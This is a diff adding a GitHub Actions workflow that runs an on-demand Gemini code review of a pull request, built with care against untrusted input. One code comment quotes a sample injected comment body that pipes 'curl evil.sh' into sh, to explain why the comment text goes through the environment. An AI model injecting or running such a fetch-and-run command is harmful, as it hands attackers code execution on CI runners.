@@ -1,0 +1,150 @@
+name: "Gemini On-Demand Code Review"
+
+# Comment `@gemini code-review` on a PR, optionally followed by instructions:
+#
+#   @gemini code-review focus on the auth bloc and error surfaces
+#
+# Why the steps are inline rather than a marketplace action: this trigger is
+# `issue_comment`, whose payload has no `github.event.pull_request`. Actions
+# built for the `pull_request` event read `pull_request.base.sha`,
+# `head.sha` and `.number` from it, so under this trigger they diff nothing
+# and have no PR to comment on. The PR is fetched by number instead.
+on:
+  issue_comment:
+    types: [created]
+
+jobs:
+  review:
+    if: >
+      github.event.issue.pull_request &&
+      contains(github.event.comment.body, '@gemini code-review') &&
+      (github.event.comment.author_association == 'OWNER' || github.event.comment.author_association == 'COLLABORATOR')
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      pull-requests: write
+    steps:
+      # No checkout. The diff comes from the API, so untrusted PR code never
+      # lands on a runner that holds GEMINI_API_KEY and a write token — there
+      # is no config, script or dependency of the PR's for anything to run.
+      - name: Collect the review request
+        id: request
+        env:
+          GH_TOKEN: ${{ github.token }}
+          REPO: ${{ github.repository }}
+          PR_NUMBER: ${{ github.event.issue.number }}
+          # Through the environment, never `${{ }}` inside `run:`.
+          # Interpolated into the script, a comment body is executed as
+          # shell — a body ending `"; curl evil.sh | sh; #` would run here.
+          COMMENT_BODY: ${{ github.event.comment.body }}
+        run: |
+          set -euo pipefail
+
+          instructions=$(
+            printf '%s' "$COMMENT_BODY" \
+              | sed 's/@gemini code-review//gi' \
+              | tr '\n' ' ' \
+              | tr -s ' ' \
+              | sed 's/^ //; s/ $//'
+          )
+          if [ -z "$instructions" ]; then
+            instructions="General review: correctness, security, and clarity."
+          fi
+
+          gh api "repos/$REPO/pulls/$PR_NUMBER" \
+            -H "Accept: application/vnd.github.v3.diff" > pr.diff
+
+          # Gemini has a large context window, but an enormous diff wastes a
+          # request that will be truncated anyway. Say so in the output
+          # instead of silently reviewing half a PR.
+          max_bytes=400000
+          if [ "$(wc -c < pr.diff)" -gt "$max_bytes" ]; then
+            head -c "$max_bytes" pr.diff > pr.diff.tmp
+            mv pr.diff.tmp pr.diff
+            echo "truncated=true" >> "$GITHUB_OUTPUT"
+          else
+            echo "truncated=false" >> "$GITHUB_OUTPUT"
+          fi
+
+          delimiter="EOF_$(openssl rand -hex 16)"
+          {
+            echo "instructions<<${delimiter}"
+            echo "$instructions"
+            echo "${delimiter}"
+          } >> "$GITHUB_OUTPUT"
+
+      - name: Ask Gemini
+        id: gemini
+        env:
+          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
+          MODEL: gemini-2.5-pro
+          # Attacker-influenced, so it stays data: jq builds the JSON, and
+          # the value is never concatenated into the request by hand.
+          INSTRUCTIONS: ${{ steps.request.outputs.instructions }}
+          TRUNCATED: ${{ steps.request.outputs.truncated }}
+        run: |
+          set -euo pipefail
+
+          note=""
+          if [ "$TRUNCATED" = "true" ]; then
+            note=$'\n\nNOTE: the diff was truncated; review only what is shown.'
+          fi
+
+          jq -n \
+            --arg instructions "$INSTRUCTIONS" \
+            --arg note "$note" \
+            --rawfile diff pr.diff \
+            '{
+              contents: [{
+                parts: [{
+                  text: (
+                    "Review this pull request diff. Report concrete defects "
+                    + "with file and line, and say plainly when something is "
+                    + "fine. Do not invent issues to fill space.\n\nFocus: "
+                    + $instructions + $note + "\n\n```diff\n" + $diff + "\n```"
+                  )
+                }]
+              }],
+              generationConfig: { temperature: 0 }
+            }' > request.json
+
+          http_code=$(
+            curl -sS -o response.json -w '%{http_code}' \
+              -X POST \
+              -H "Content-Type: application/json" \
+              -H "x-goog-api-key: ${GEMINI_API_KEY}" \
+              --data @request.json \
+              "https://generativelanguage.googleapis.com/v1beta/models/${MODEL}:generateContent"
+          )
+
+          if [ "$http_code" != "200" ]; then
+            # The body can echo request content, so surface the status only.
+            echo "Gemini request failed with HTTP $http_code" >&2
+            jq -r '.error.message // "no error message"' response.json >&2 || true
+            exit 1
+          fi
+
+          jq -r '[.candidates[]?.content.parts[]?.text] | join("")' \
+            response.json > review.md
+
+          # Content, not size: `jq -r` writes a trailing newline, so an empty
+          # result is a 1-byte file and `[ -s ]` would call it non-empty.
+          if [ -z "$(tr -d '[:space:]' < review.md)" ]; then
+            echo "Gemini returned no text (safety block, or an empty candidate)" >&2
+            jq -r '.promptFeedback.blockReason // "no block reason"' response.json >&2 || true
+            exit 1
+          fi
+
+      - name: Post the review
+        env:
+          GH_TOKEN: ${{ github.token }}
+          REPO: ${{ github.repository }}
+          PR_NUMBER: ${{ github.event.issue.number }}
+        run: |
+          set -euo pipefail
+          {
+            echo "## Code review by Gemini"
+            echo
+            cat review.md
+          } > comment.md
+          gh pr comment "$PR_NUMBER" --repo "$REPO" --body-file comment.md
